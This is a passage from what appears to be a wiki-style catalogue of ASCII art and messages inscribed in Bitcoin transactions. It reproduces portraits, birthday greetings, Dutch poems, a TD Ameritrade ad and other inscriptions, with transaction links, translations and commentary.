  MMMMMMNMMMMMMMMMMMMZ=+??II77$$$$77777I+==~~~~~:~~=+?MMMMMMMMMMMMMMMMMMMMMMMMMMMM
  MMMMNNNMMMMMMMMMM:+?II???II77$ZZZ$$$$$II+===+~~==??MMMMMMMMMMMMMMMMMMMMMMMMMMMMM
  MMMMMNNNNNMMMMMM7:I?77I?IIII7$$ZZOOZ7$$$7I??III?++8NMMMMMMMMMMMMMMMMMMMMMMMMMMMM
  MMMMMNMNNNMMMMMM,:I?$$IIIIIII7$$ZZZZ88OZ$$$777I?+=NNMMMMMMMMMMMMMMMMMMMMMMMMMMMM
  MMMMMMMMNNNMMMMZ,,?7ZO7IIIIIII7$$$$$$ZOOOZ7????++=DMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
  MMMMMMMMMNNMMM8:,,,,Z$7I?I??I7777$$$$$$7II?++++++,ZMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
  MMMMMMMMMMMNDI,,,,,,,?7II?????II7777777I?+???++++.8MMMMMMMMMMMMMMMMMMMMMMMMMMMMM
  MMMMMMNNND=,,,,,,,,,,,.?????????IIII7I7I???++++=~.?MMMMMMMMMMMMMMMMMMMMMMMMMMMMM
  MMMN7:,,....,,,,,,,,,,,..??+++++?????III?++++++$.,..IDMMMMMMMMMMMMMMMMMMMMMMMMMM
  ```
<a id="_81"></a>
- <a id="image-warren-buffet"></a>
  <img src="https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/ascii-art/0fc0c50e410b62ee3a316135711116db6b4e728841c976f29ab85e2a41e0dcc3.png" alt="" height="800">

  **[Figure 5](#image-warren-buffet). Warren Buffet**. <a id="_82"></a>
  [tx 0fc0c50e410b62ee3a316135711116db6b4e728841c976f29ab85e2a41e0dcc3](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0368.txt#L98) block 368133 ([2015-08-02](https://www.blockchain.com/explorer/transactions/btc/0fc0c50e410b62ee3a316135711116db6b4e728841c976f29ab85e2a41e0dcc3)) Associated message:<a id="_83"></a>


  > if you like it, leave a tip: 1P675gRxNwhFXgfuDu5yXwGDgwLDbXNJqz    BM-2cUDAqyqcnksx7YDtgu2y72xDxcRjPeYfo

  1P675gRxNwhFXgfuDu5yXwGDgwLDbXNJqz was never tipped so far: [https://www.blockchain.com/explorer/addresses/btc/1P675gRxNwhFXgfuDu5yXwGDgwLDbXNJqz](https://www.blockchain.com/explorer/addresses/btc/1P675gRxNwhFXgfuDu5yXwGDgwLDbXNJqz) TODO what is "BM-2cUDAqyqcnksx7YDtgu2y72xDxcRjPeYfo"?

  <a id="image-warren-buffett"></a>
  ![](https://web.archive.org/web/20220329180621im_/https://quietrev.com/wp-content/uploads/2015/03/warren-buffett_SOURCE_wallstreetplaybook.jpg)

  **[Figure 6](#image-warren-buffett). Warren Buffett**. [Source](https://quietrev.com/warren-buffett/). Off-chain reference image for the [ASCII art](#ascii-art).

  <a id="_84"></a>
  This image was likely inscribed due to Buffet's general status as an investing God, he did not appear to have strong links to crypto at the tim, he did not appear to have strong links to crypto at the time

  <a id="_85"></a>
  Interestingly, in a twist of fate, in 2018 Buffet would later come to strongly criticize cryptocurrency as "probably rat poison squared": [https://finance.yahoo.com/news/warren-buffett-says-wouldnt-pay-175917403.html](https://finance.yahoo.com/news/warren-buffett-says-wouldnt-pay-175917403.html). In 2025 however it was reported that Berkshire Hathaway did invest in a crypto-related company, Nu Holdings

  <a id="_86"></a>
  Change is returned towards the middle at output 545 right back to the sending address 1Jhf86XdHsAQYKRZjQ1CuJCnyUqVKnasEW, thus slightly breaking a raw non-ASCII-only dump.

  <a id="_87"></a>
  [Person identified by ottosch on Twitter](https://twitter.com/ottosch_/status/1756842650463072410).

  ---
<a id="_88"></a>
- <a id="image-ascii-art-of-mr-spock"></a>
  <img src="https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/ascii-art/467c075ee6edaa60f184d0683655f1f6d267efd98061872f167ef7ca9ca7c50f.png" alt="" height="900">

  **[Figure 7](#image-ascii-art-of-mr-spock). ASCII art of Mr. Spock**. [tx 467c075ee6edaa60f184d0683655f1f6d267efd98061872f167ef7ca9ca7c50f](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0369.txt#L79) ([2015-08-09](https://www.blockchain.com/explorer/transactions/btc/467c075ee6edaa60f184d0683655f1f6d267efd98061872f167ef7ca9ca7c50f)). The eyebrows are a bit wrong, and he is a bit too young for the original series. Minor manual fixes were applied by [Ciro Santilli](ciro-santilli.md), it is unknown why this was needed.
<a id="_89"></a>
- <a id="_90"></a>
  [tx beeead7429cdb78f3bfe8a17d8e485a3a847b3e99a511a025bb49e2948af5058](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0378.txt#L2612) block 378735 ([2015-10-13](https://www.blockchain.com/explorer/transactions/btc/beeead7429cdb78f3bfe8a17d8e485a3a847b3e99a511a025bb49e2948af5058)) contains a happy birthday message:<a id="_91"></a>


  > To my dear friend Mariano, por muchos anos más de diversión!

  the Spanish part translates to:<a id="_92"></a>


  > Here's to many more years of fun

  It does not show well in our ASCII jumps because the non ASCII characters are [UTF-8](telecommunication.md#utf-8)-encoded. Europeans... This is followed by the [ASCII art](#ascii-art) with Marian's nerdy face in it:<a id="_93"></a>

  ```````
   _______  _______ ____      ___   _______    _______  __   __  __   __  _______  ___      _______
  |       ||       ||   |    |   | |       |  |       ||  | |  ||  |_|  ||       ||   |    |       |
  |    ___||    ___||   |    |   | |____   |  |       ||  | |  ||       ||    _  ||   |    |    ___|
  |   |___ |   |___ |   |    |   |  ____|  |  |       ||  |_|  ||       ||   |_| ||   |    |   |___
  |    ___||    ___||   |___ |   | | ______|  |      _||       ||       ||    ___||   |___ |    ___|
  |   |    |   |___ |       ||   | | |_____   |     |_ |       || ||_|| ||   |    |       ||   |___
  |___|    |_______||_______||___| |_______|  |_______||_______||_|   |_||___|    |_______||_______|

                                            ``````
                                    ``..---------------...``
                                  `.--------------------------.`
                                .-------------------------------.`
                               .----------------------------------`
                              `------------------------------------`
                              .------------------------------------.
                              ------------:+yo------+yo:-----------.
                              ---------/shhs+:------:+shhs+--------.
                            ``--------so$/:--------------:/os--------``
                          `.-------------/oso:------:ooo/--------------`
                          .------------:ho:-:ohsssshs:--+h:------------.
                          .------------so-----y+--/h-----+y------------.
                          .-----------:-:h+--:oh----ys:--+h/-----------.
                          .-------------/ooo/------:ooo+--------------.`
                            `..------------------------------------..`
                              .----------------------------------.
                              `-----------.```....```.-----------`
                               .------------.``````.------------`
                                `-----------------------------.`
                                  `.-----------------------..`
                                     ``....----------....``

             __   __  _______  ______    ___   _______  __    _  __   __   __
            |  |_|  ||   _   ||    _ |  |   | |   _   ||  |  | ||  | |  | |  |
            |       ||  |_|  ||   | ||  |   | |  |_|  ||   |_| ||  | |  | |  |
            |       ||       ||   |_||_ |   | |       ||       ||  | |  | |  |
            |       ||       ||    __  ||   | |       ||  _    ||__| |__| |__|
            | ||_|| ||   _   ||   |  | ||   | |   _   || | |   | __   __   __
            |_|   |_||__| |__||___|  |_||___| |__| |__||_|  |__||__| |__| |__|
  ```````
  which reads:<a id="_94"></a>


  > Feliz cumple, Marian

  which means:<a id="_95"></a>


  > Happy Birthday, Marian

  The message is encoded with [OP\_RETURN](cryptocurrency.md#op-return) payloads across multiple transactions, 40 bytes per transaction. They actually managed to upload two almost fully consecutive transaction blocks and in the correct order. Could they be miners?

  <a id="_96"></a>
  Some of the payloads contain newlines, you are just supposed to paste all payloads together to form the image. Our reconstruction here is manual however, lazy to script it properly.
<a id="_97"></a>
- [tx f6039915b829377849be87fc242303873e6574528db7916dd81ff44141b3560f](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0409.txt#L697) ([2016-04-27](https://www.blockchain.com/explorer/transactions/btc/f6039915b829377849be87fc242303873e6574528db7916dd81ff44141b3560f)) via [cryptograffiti.info](#cryptograffiti-info) contains some candles followed by poem that starts with:<a id="_98"></a>
  > vaardig regulerend de orde van de dag

  Is in [Dutch](continent.md#netherlands) of course, literally:<a id="_99"></a>
  > skillfully regulating the order of the day

  Given the date and language, it appears to be a reference to [Koningsdag](https://en.wikipedia.org/wiki/Koningsdag), Dutch national holiday that celebrated the birthday of their King at the time, [King Willem-Alexander](https://en.wikipedia.org/wiki/Willem-Alexander_of_the_Netherlands). Born in 1956, he would have been turning 60 at the time, so a nice round number in 2016 when these birthday candles were [inscribed](social-technology.md#inscription-blockchain).<a id="_100"></a>

  ```
                    )                    `
                  /(l                   /)
                  (  \                  / (
                  ) * )                ( , )
                  \#/                  \#'
                .-"#'-.             .-"#"=,
              (  |"-.='|            '|"-,-"|
              )\ |     |  ,        /(|     | /(         ,
    (       /  )|     | (\       (  \     | ) )       ((
    )\     (   (|     | ) )      ) , )    |/ (        ) \
    /  )     ) . )     |/  (     ( # (     ( , )      /   )
  ( * (      \#/|     (`# )      `#/|     |`#/      (  '(
    \#/     .-"#'-.   .-"#'-,   .-"#'-.   .-=#"-;     `#/
  .-"#'-.   |"=,-"|   |"-.-"|)  1"-.-"|   |"-.-"|   ,-"#"-.
  |"-.-"|   |  !  |   |     |   |     |   |     !   |"-.-"|
  |     |   |     |._,|     |   |     |._,|     a   |     |
  |     |   |     |   |     |   |     |   |     p   |     |
  |     |   |     |   |     |   |     |   |     x   |     |
  '-._,-'   '-._,-'   '-._,-'   '-._,-'   '-._,-"   '-._,-'
  ```

  The poem also appears at: 2422215c9a6040c0e337bf1c1e9b2b32244a1e36f3dd3e79fb77592c90bbb5a8.
<a id="_101"></a>
- [tx a55e7587bb34a56ae1113b0848506ea2fcf0c0e1af8c241e76677eb2bcb727eb](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0409.txt#L807) ([2016-04-27](https://www.blockchain.com/explorer/transactions/btc/a55e7587bb34a56ae1113b0848506ea2fcf0c0e1af8c241e76677eb2bcb727eb)) via [cryptograffiti.info](#cryptograffiti-info)<a id="_102"></a>

  ```
  /y            _,     _   _    ,_
            o888P     Y8o8Y     Y888o.
          d88888      88888      88888b
        ,8888888b_  _d88888b_  _d8888888,
        888888888888888888888888888888888
        888888888888888888888888888888888
          Y8888P"Y888P"Y888P-Y888P"Y88888'
          Y888   '8'   Y8P   '8'   888Y
            '8o          V          o8'
              `                   `
  ```

  The image is also reproduced a bit later at [tx 959a19729ca02b1e06e600a331d7f4603669a7eaaa20b5cfb9f3528e3005a8f2](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0410.txt#L1116), [block 410357](https://www.blockchain.com/explorer/blocks/btc/410357) [https://www.blockchain.com/explorer/blocks/btc/410357](https://www.blockchain.com/explorer/blocks/btc/410357) ([2016-05-05](https://www.blockchain.com/explorer/transactions/btc/959a19729ca02b1e06e600a331d7f4603669a7eaaa20b5cfb9f3528e3005a8f2)). This second one includes the lyrics:<a id="_103"></a>
  > Denk niet wit, denk niet zwart.  
  > Denk niet zwart-wit  
  > Maar alleen aan de kleur van je hart.

  translation;<a id="_104"></a>
  > Don't think white, don't think black.  
  > Don't think black and white  
  > But only by the color of your heart.

  of the 1984 song "[Zwart Wit](https://nl.wikipedia.org/wiki/Zwart_wit)" (Black and white) by [Dutch](continent.md#netherlands) artist [Frank Boeijen](https://en.wikipedia.org/wiki/Frank_Boeijen), sample performance by the artist:<a id="video-zwart-wit-by-frank-boeijen"></a>
  **[Video 2](#video-zwart-wit-by-frank-boeijen). Zwart Wit by Frank Boeijen.** [Source](https://www.youtube.com/watch?v=mEUWbOLg0zI).
<a id="_105"></a>
- [tx 15fb36eb159d2bbc78a4a4dffc29d166e662a020f42211c176648015102cbf77](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0410.txt#L1213), [block 410366](https://www.blockchain.com/explorer/blocks/btc/410366) ([2016-05-05](https://www.blockchain.com/explorer/transactions/btc/15fb36eb159d2bbc78a4a4dffc29d166e662a020f42211c176648015102cbf77)) via [cryptograffiti.info](#cryptograffiti-info) has a cute "ASCII art poem" if you will:<a id="_106"></a>

  ```
  ####################
  Transhumanism and###
  singularity are lies
  and tricks. Don't###
  let them brainwash U
  and become enslaved#
  to Mr. Computer#####
  It's not intelligent
  ####################
  The Angels Trumpet##
  lures to takes away#
  your free will######
  You loose emotions,#
  CREATIVITY, sanity##
  and true INNOVATION#
  You have been warned
  ####################
  Humans are not tools
  to abuse and discard
  They have never been
  and they'll never be
  ####################
  Love & cherish life#
  Don't give up ur <3!
  ####################
  Pray for the Victims
  Send them love######
  Heal Mr.Computer too
  ####################
  ```

  57bc317de1d9a1724b751a008951f76c79c0b787d47cb7561598cc62994237ab has a related one.
<a id="_107"></a>
- [tx e10c958e199daf71ab31342d40e188380fe84f07abee6a11d02c274d5431902a](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0413.txt#L1677) ([2016-05-26](https://www.blockchain.com/explorer/transactions/btc/e10c958e199daf71ab31342d40e188380fe84f07abee6a11d02c274d5431902a)) via [cryptograffiti.info](#cryptograffiti-info) [ASCII typeface](art.md#ascii-typeface) spelling "CrimsonHexagon"<a id="_108"></a>

  ```
  _________        .__                              ___ ___
  \_   ___ \_______|__| _____   __________   ____  /   |   \   ____ ___  ________     ____   ____   ____
  /    \  \/\_  __ \  |/     \ /  ___/  _ \ /    \/    ~    \_/ __ \\  \/  /\__  \   / ___\ /  _ \ /    \
  \     \____|  | \/  |  Y Y  \\___ (  <_> )   |  \    Y    /\  ___/ >    <  / __ \_/ /_/  >  <_> )   |  \
   \______  /|__|  |__|__|_|  /____  >____/|___|  /\___|_  /  \___  >__/\_ \(____  /\___  / \____/|___|  /
          \/                \/     \/           \/       \/       \/      \/     \//_____/             \/
                                     http://smarturl.it/spacetransient
  ```

  The URL redirect is dead as of January 2024. Possible meaning: [https://en.wikipedia.org/wiki/Crimson_Hexagon](https://en.wikipedia.org/wiki/Crimson_Hexagon)
<a id="_109"></a>
- <a id="image-i-love-you-forever"></a>
  <img src="https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/ascii-art/ddc39a3da0ee6f0651bdf0be7119b4db2612b19416e9128091b1f29cdfe2aa0d.png" alt="" height="800">

  **[Figure 8](#image-i-love-you-forever). I Love You Forever**. [tx ddc39a3da0ee6f0651bdf0be7119b4db2612b19416e9128091b1f29cdfe2aa0d](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0378.txt#L2349) ([2016-06-20](https://www.blockchain.com/explorer/transactions/btc/eda07af9584391bb6f5ebb07ba57a51b610751fdf06ae49d9166225c36d97d0b)) via [cryptograffiti.info](#cryptograffiti-info). Busts of a man and a [woman](biology.md#female) looking forward.
<a id="_110"></a>
- <a id="code-ascii-art-of-dr-bill-maurer"></a>
  ```
  ...........................................................  .......................................
  ........................................................?$OOZZOZ:. .................................
  ......................................................?8I~,....,,=,.................................
  .... .................................................8~~~:::,,,,,~=................................
  ~~::,.................................................==~~~:,,,,:,:I=...............................
  ::~~~::,,............................................:=====$8D+:~:~$7+ .............................
  ,,,:::~~~::,... .....................................:IDD8DI$Z7$?=?$7+..............................
  ,,,,,,,,::~~::,,....................................8?$Z$N:++?+=~~~~?~..............................
  ,,,,,,,,,,,,::~~::,,.. .............................. =+D=,:=7+~:::=~=~.............................
  ,,,,,,,,,,,,.,,,:::::,,...............................+?7OIO8ZZ?~~+7+~,.............................
  ,,,,,,,,,,,.,,.,..,,:::::,,.. ........................?$NDD$ZODD=+?II,..............................
  ,,,,,,,,,,,,,,,.,,....,,,::::,,... ..................,+8N$I$IZZOI$7I+O..............................
  ,,,,,,,,,,,,,,.,,........,,,::::,,....................$8DD8O7?78OZ$I+,..............................
  ,,,,,,,,,,,.,.,..............,,::::,,................ .D88ZZOZOOO$I+~+..............................
  ,,,,,.,,,,,.,..............................,............888D8O8Z?+==~:.............................:
  ,,,,,,,,,,,,.,.............................,..............?$OI?+++=+....$+.....................:::::
  ...........,,,.................... .......................??+??++??..,.D8O$Z?..............,::::::::
  ...........,,,...........................................IM7I??II+..,.ND8D88ZZ$Z$7......::::::::::::
  ,,,,........................... ......................?7,D77$77I?7O,.DDND8888888.....:::::::::::::~:
  ,,,,,... ...................... ..................~ZOZ8.DN7?++Z?+IM=NNNDD88NDDN..,.....:::::,:~~:,,,
  ,,,,,,,..........................................O88NDDDNN+~=~==+NMMNNDDDNNNDD=,........,:~~,,,,,,,,
  ,,,,,,,.........................................$DDDDNNNNNI~~7~=MNNNNDNNNNNDD8,..,,......,,,,,,,,,,,
  ,,,,,:,... .. ..................................8DNNDDNNNNN::,?NNMNNNNNDDNNND7.:..,,......,,,,,,,,,,
  ,,::::,... .....................................DDDNNNDNNNN7,DNNNNNNNNNNNNDDD=,~,,,,,.......,,.,,,,,
  ::::::,........................................,DNNNNNNNNNNNDMNNNNNNNNNNNNNND,,,.,,,,.......,,,,,,,,
  ::::::,........................ ......... .....,NNNNNNNNMNNDMMMMNNNNNNNNNNNMN,,,,,,,,,.....,,,,,,,,,
  ::::::,.....,..................................+NNNNNNMMMMDNMMNNNNNNNNNNNNNMMN~=,,,,,,.,.....,,,,,,,
  ,,,,,,,,..................... ................:~NNNNNNNDNMNNNNNNNNNNNNNNNNNMMMD?,,,,,,,.......,,,,,,
  .....,,,....,................ ................::NDDNNNNNNMNNNMNNNNNNNNNNMMMMMMMM::,::,,.....,,,,,,,,
  .....,,,.....................................,::~NNNNNNMMNNNMNMNMNMMMMMNNMNNNNMM~:::::,,,....,,,,,,,
  ~~~~~~=:..................................,::,:::=NNNNMMMDNMMMMMMMMMMMMMMMMMNNMM?~:::::,,,....,,,,,,
  ?+????I~..............................,:::::::~~~~DNNMMMMNMMMMMMMMMMMMMMMMMMMMMMM~~:::,,,,...,,,,,,,
  ???????:...........................,::::::::::~~~~?DMMMMMN8MMMMMMMMMMMMMMMMMMMMMM~=:~:~,,,....,,,,,,
  +++++++:...,.,,..,,,,..,,,......:::::::::::,:~~~~=~OMMNNMMMMNMMMMMMMMMMMMMMNMMMMMZ==~~:::,....,,,,,,
  +++++++:.,..................,:::::::::::,~~:,~~=~+~7MMNMMNNMMMMMMMMMMMMMMMMMMNMMMM?++~~~::,...,,,,,,
  ++++++=:.................,::::::::::,:~~:,,,.~~=~+=DMNNMNMNMMNMMMMMMMMMMMMMMMMMMMMO+=:=~~~:,..,,,,,,
  +===+==:.... .........:::::::::::,:=~:,,,,...:===+=DNNNMDMMMMMMMMMMMMMMMMMNNNMMMMMM7=+?=:~,::,,,,,,,
  ====+==:,:,,,,,,,,,:::~::::::::~=::,,,,,.....~~++???NNNNDMMMMMMMMMMMMMMMMMMMNMMMMMMMI?=:~~~:.,.,,,,,
  ====+===~::::::~::::::::::::~=::,,,,.........:~??77$NMNMNDNMMMMNMMMMMMMMMMMMNNNMMMMM$$I+,~:::::,,,,,
  =======~~::::~~~~:::::::~=~:,,,,,,,..........:~=++7ZNNNMNMMMMMMMMMMMMMMMMMMMNNMMMMMNNI~=,:,.....,,,,
  =======~::~~~~~~~~:::~=~:,,,,,,,...,.........=+~+?ZONNNMNMMMMMMMMMMMMMMMMMMMMMMMMMMMD~~,,:,,:,:,,,,,
  =====~~~~~~~~~~~~~==~:,,,,,,,,,,,...........,:~=+IZONNNMMMMMMMMMMMMMMMMMMMMMNMMMMMMMD~:~~::,..,,,,,,
  Dr. Bill Maurer
  Economic anthropologist
  ```
<a id="_114"></a>
- [tx e35a9a198b77ece71272b66f94f9329184c6e4ee48e9e768e54ee8caf5d471fb](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0425.txt#L1578) block 425758 ([2016-08-18](https://www.blockchain.com/explorer/transactions/btc/e35a9a198b77ece71272b66f94f9329184c6e4ee48e9e768e54ee8caf5d471fb)) via [cryptograffiti.info](#cryptograffiti-info) has a dark one:<a id="_115"></a>

  ```
  killyour
  children
  setthemz
  free.il+
  6(\___/)
  6( O_O )
  6 `---`%
  evlbunny
  here)to@
  rule^you
  ```

  which reads:<a id="_116"></a>
  > Kill your children, set them free. [666](religion.md#number-of-the-beast). Evil bunny here to rule you.
<a id="_117"></a>
- [tx eede99ab9b50aa5871fcb4b1d0d1a22ac2fa94b08172b1fa677f0b200e96f84a blk 437669](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0437.txt#L1937) ([2016-11-06](https://www.blockchain.com/explorer/transactions/btc/eede99ab9b50aa5871fcb4b1d0d1a22ac2fa94b08172b1fa677f0b200e96f84a)):<a id="_118"></a>

  ```
      __  / __
     / * `'   \
     \        /
       ._,.__,
  APPLE BAKE '16
  ```
<a id="_119"></a>
- <a id="code-study-math-and-computer-science-at-augustana-college"></a>
  ```
  ____________________________________________________
  |                         AA                         |
  |                       AAAAAA                       |
  |                      AAAAAAAA                      |
  |                    AAAAAAAAAAAA                    |
  |                  AAAAAA    AAAAAA                  |
  |                 AAAAAA      AAAAAA                 |
  |                AAAAAA        AAAAAA                |
  |               AAAAAA          AAAAAA               |
  |              AAAAAA            AAAAAA              |
  |             AAAAAA              AAAAAA             |
  |            AAAAAAA              AAAAAAA            |
  |           AAAAAAA                AAAAAAA           |
  |          AAAAAAAA                AAAAAAAA          |
  |          AAAAAAAA                AAAAAAAA          |
  |         AAAAAAAA                  AAAAAAAA         |
  |         AAAAAAAA                  AAAAAAAA         |
  |        AAAAAAAAA                  AAAAAAAAA        |
  |        AAAAAAAAA                  AAAAAAAAA        |
  |        AAAAAAAAA                  AAAAAAAAA        |
  |        AAAAAAAAA                  AAAAAAAAA        |
  |        AAAAAAAAA                  AAAAAAAAA        |
  |        AAAAAAAAA                  AAAAAAAAA        |
  |        AAAAAAAAA                  AAAAAAAAA        |
  |        AAAAAAAAA                  AAAAAAAAA        |
  |        AAAAAAAAA                  AAAAAAAAA        |
  |        AAAAAAAAA                  AAAAAAAAA        |
  |        AAAAAAAAA                  AAAAAAAAA        |
  |        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA        |
  |        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA        |
  |        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA        |
  |        AAAAAAAAA                  AAAAAAAAA        |
  |        AAAAAAAAA                  AAAAAAAAA        |
  |        AAAAAAAAA                  AAAAAAAAA        |
  |        AAAAAAAAA                  AAAAAAAAA        |
  |        AAAAAAAAA                  AAAAAAAAA        |
  |        AAAAAAAAA                  AAAAAAAAA        |
  |        AAAAAAAAA                  AAAAAAAAA        |
  |        AAAAAAAAA                  AAAAAAAAA        |
  |        AAAAAAAAA                  AAAAAAAAA        |
  |        AAAAAAAAA                  AAAAAAAAA        |
  |        AAAAAAAAA                  AAAAAAAAA        |
  |        AAAAAAAAA                  AAAAAAAAA        |
  |        AAAAAAAAA                  AAAAAAAAA        |
  |        AAAAAAAAA                  AAAAAAAAA        |
  |        AAAAAAAAA                  AAAAAAAAA        |
  |        AAAAAAAAA                  AAAAAAAAA        |
  |        AAAAAAAAA                  AAAAAAAAA        |
  |____________________________________________________|
  ```
<a id="_125"></a>
- [tx 12fba831eb6de8eb944e80e42c78d29cf05a833831a335a5711a4b61cf90802e](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0516.txt#L331) ([2018-04-06](https://www.blockchain.com/explorer/transactions/btc/12fba831eb6de8eb944e80e42c78d29cf05a833831a335a5711a4b61cf90802e))<a id="_126"></a>

  ```
  Grishchuk Roman_____
  Pavlovich___________
  ________AND_________
  Gres Anna Leonidovna
  Married 01/04/2015__
  ====================
  =====++++==++++=====
  ====++===++===++====
  ===++====++====++===
  ===++==========++===
  ====++========++====
  =====++======++=====
  ======++====++======
  =======++==++=======
  ========++++========
  =========++=========
  ```

  Found by [Messages from the mines](#messages-from-the-mines).
<a id="_127"></a>
- [tx fd739c26276ea81fea8210939d527fccd7c9622f93aa17d18ee0bd5321387fde](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0517.txt#L202) block 517406 ([2018-04-09](https://www.blockchain.com/explorer/transactions/btc/fd739c26276ea81fea8210939d527fccd7c9622f93aa17d18ee0bd5321387fde)) contains the first line of an ad from American stockbroker company [TD Ameritrade](https://en.wikipedia.org/wiki/TD_Ameritrade). It is encoded one line per transaction with [OP\_RETURN](cryptocurrency.md#op-return), but the ordering is completely scrambled. A link is given: [https://TDAmeritrade.com/Blockchain](https://TDAmeritrade.com/Blockchain) but it is 404 as of January 2024 of course, companies can't keep their pages up for more than 3 seconds, but there is an archive which decodes the indented picture for us, including the corresponding tx hashes for each line [https://web.archive.org/web/20180902001329/https://www.tdameritrade.com/landing-pages/offer/blockchain/index.html?cid=TVTDACDDRTVJ64](https://web.archive.org/web/20180902001329/https://www.tdameritrade.com/landing-pages/offer/blockchain/index.html?cid=TVTDACDDRTVJ64), here is a copy from the website because we were lazy to double check each line:<a id="_128"></a>

  ```
  .............See the full picture at TDAmeritrade.com/Blockchain................
  ................................................................................
  ................................................................................
  ................................................................................
  .......................................................................^V^......
  ........XXX......................................................^V^............
  .......XXXXX....................................................................
  ........XXX=====================................................................
  ........| | ....................\\..............................................
  ........| | .......................\\=========================..................
  ........| | ..................................................\\................
  ........| | ...................................................\\==========.....
  ........| | ...............................................................\\...
  ........| | ................................................................||..
  ........| |.................................................................||..
  ........| | XXXXXXXXXXXXXXX ................................................||..
  ........| | XXXXXXXXXXXXXXX ................................................||..
  ........| | X| .........\XX ....@ ..................* ..@ ..........@ ......||..
  ........| | XXX| @ XXX\  XX    @ @   @/@@@  @@  @/@ @ @@@ @/@  @@ @@@ .@@ ..||..
  ........| | XXX| @ XXXX| XX   @@@@@  @ @ @ @ /  @   @  @  @   @ @ @ @ @ / ..||..
  ........| | XXX| @ XXX/  XX  @@   @@ @ @ @  @@@ @   @  @, @    @@ @@@  @@@  ||..
  ........| | XXX| @      /XX ................................................||..
  ........| | XXXXXXXXXXXXXXX ................................................||..
  ........| | XXXXXXXXXXXXXXX ................................................||..
  ........| | ................................................................||..
  ........| | ................................................................||..
  ........| | ................................................................||..
  ........| | ................................................................||..
  ........| | ................................................................||..
  ........| | ................................................................||..
  ........| |===================== ...........................................||..
  ........| |.....................\\========== ...............................||..
  ........| |.................................\\==============================//..
  ........| |.....................................................................
  ........| |.....................................((((()))).......................
  ........| |...................................((((((())))).(((()))).............
  ........___..................................(((((((())))))(((()))))............
  ......./___)................................((((((((()))))((((()))))))..........
  ....../ | |..................................(((((((((((()))))))))))))..........
  _____ ..| ( )...................................................................
  ........| ( )...................................................................
          | ( )..............(().(()..............................................
  _____\__| ( )............((((())))))............................................
  ........| |.............((((((()))))))..........................................
  ........| |.....................................................................
  ........| |.....................................................................
  ....MMMM| |MMMMM................................................................
  MMMMMMMM| |MMMMMMM..............................................................
  MMMMMMMM| |MMMMMMMMMMMM...................................$.....................
  MMMMMMMM| |MMMMMMMMMMMMMMMM............................$$$$$$$..................
  MMMMMMMM| |MMMMMMMMMMMMMMMMMMMMM....................$$$$$$$$$$$$$$$.............
  MMMMMMMM| |MMMMMMMMMMMMMMMMMMMMMMMM............$$$$$$$$$$$$$$$$$$$$$$$..........
  MMMMMMMM| |MMMMMMMMMMMMMMMMMMMMMMMMMMMM......$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$....
  MMMMMMMM| |MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
  MMMMMMMM| |MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
  MMMMMMMM| |MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
  MMMMMMMM| |MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM$$$$$$$$$$$$$$$$$$$$$$$$$
  MMMMMMMM| |MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM$$$$$$$$$$$$$$$$$$$$$
  MMMMMMMM| |MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM$$$$$$$$$$$$$$$$$$
  MMMMMMMM| |MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM$$$$$$$$$$$$$$$
  MMMMMMMM| |MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM$$$$$$$$$$
  MMMMMMMM| |MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM$$$$$$$
  \\\\\\\\| |\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
  \\\\\\\\| |\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
  \\\\\\\\\ /\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
  \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
  \\\\\ TD Ameritrade, Inc., member FINRA/SIPC. copyright 2018 TD Ameritrade \\\\\
  \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
  ```
<a id="_129"></a>
